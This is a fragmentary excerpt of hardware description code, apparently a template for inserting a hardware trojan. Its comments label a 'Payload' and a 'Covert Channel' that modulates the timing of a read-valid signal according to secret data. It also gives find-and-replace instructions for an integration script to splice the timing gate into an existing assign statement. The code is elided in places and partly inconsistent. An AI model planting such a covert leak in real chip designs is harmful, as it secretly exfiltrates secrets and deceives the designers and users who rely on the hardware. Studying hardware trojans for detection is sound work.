 ...
 * Payload: Modulate timing of rd_valid_o based on secret data
 * 
...
assign secret_bit = rd_valid_o[0];
...
// ============================================================
// Covert Channel: Modulate timing of rd_valid_o
//
// Integration Script Must Modify:
//
// IF rd_valid_o is timing-sensitive:
//   Find: assign rd_valid_o = ready_signal;
//   Replace: assign rd_valid_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
